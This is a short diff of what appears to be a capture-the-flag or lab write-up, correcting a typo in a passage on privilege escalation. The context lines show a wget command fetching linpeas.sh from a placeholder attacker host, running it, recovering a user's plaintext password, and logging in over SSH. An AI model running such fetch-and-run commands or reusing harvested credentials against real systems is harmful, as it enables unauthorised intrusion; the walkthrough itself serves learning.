@@ -59,7 +59,7 @@ So, I executed "linpeas.sh"
 I downloaded linpeas and opened an python3 http.server
 - Command: wget http://<attacker Ip>:<port>/linpeas.sh
 
-After, executing linpeas.sh I gound an user name "grimmie" and his password "My_V3ryS3cur3_P4ss".
+After, executing linpeas.sh I found an user name "grimmie" and his password "My_V3ryS3cur3_P4ss".
 
 Performed ssh : ssh grimmie@<target ip> 
 
